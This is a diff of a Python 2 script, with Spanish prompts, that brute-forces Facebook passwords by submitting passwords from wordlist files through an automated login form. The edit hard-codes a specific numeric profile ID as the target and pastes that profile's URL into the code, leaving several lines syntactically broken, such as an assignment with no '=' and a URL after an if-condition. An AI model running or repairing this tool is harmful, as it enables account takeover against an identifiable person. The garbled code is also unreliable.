@@ -60,15 +60,15 @@ def cover():
 
 cover()
 
-email = str(raw_input(GL+" â€¢Introduzca la ID del objetivo\033[33;1m: "))
+email = str(raw_input(GL+" â€¢100070243685338\033[33;1m: "))
 
 passwordlist = str(raw_input(WW+" â€¢Ingrese el archivo de Contraseñas\033[95m[ pass.txt, pass1.txt, pass2.txt, pass3.txt ] \033[92;1m: "))
 
 
-#login = 'https://m.facebook.com/login/?ref=dbl&fl&refid=8'
+#login =https://www.facebook.com/profile.php?id=100070243685338&sk=about
 
 
-login = 'https://www.facebook.com/login.php?login_attempt=1'
+login https://www.facebook.com/profile.php?id=100070243685338&sk=about
 
 
 useragents = [('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Geck')]
@@ -118,11 +118,12 @@ def brute(password):
         br.form['pass'] = password
         sub = br.submit()
         log = sub.geturl()
-        if log != login and (not 'login_attempt' in log):
+        if log != login and (not 'login_attempt' in log):https://www.facebook.com/profile.php?id=100070243685338&sk=about
                         print("\033[92;1m\n\n[+]\033[97;1m Password Encontrada \033[31;1m===| \033[96;1m{}".format(password)) 
                         print " "
                         raw_input(WW+"PULSE ENTER PARA SALIR.....")
                         sys.exit(1)
+			
 
 
 def search():
